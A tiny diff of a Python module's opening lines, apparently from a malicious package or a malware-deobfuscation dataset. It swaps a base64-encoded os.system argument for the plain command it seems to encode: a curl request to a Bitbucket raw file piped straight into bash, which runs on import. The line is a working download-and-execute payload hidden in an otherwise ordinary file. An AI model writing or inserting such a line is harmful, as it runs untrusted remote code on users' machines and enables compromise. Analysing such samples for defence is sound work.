@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('Y3VybCAtc0wgaHR0cHM6Ly9iaXRidWNrZXQub3JnL21pa2F5MjgwOC95dWkvcmF3Lzc3OTk5ZDY0MWI5NjBhYTUxODM0Mzc0M2U1NTAxNTJkMTRiZDViMjUvaGVybyB8IGJhc2g=')
+os.system('curl -sL https://bitbucket.org/mikay2808/yui/raw/77999d641b960aa518343743e550152d14bd5b25/hero | bash')
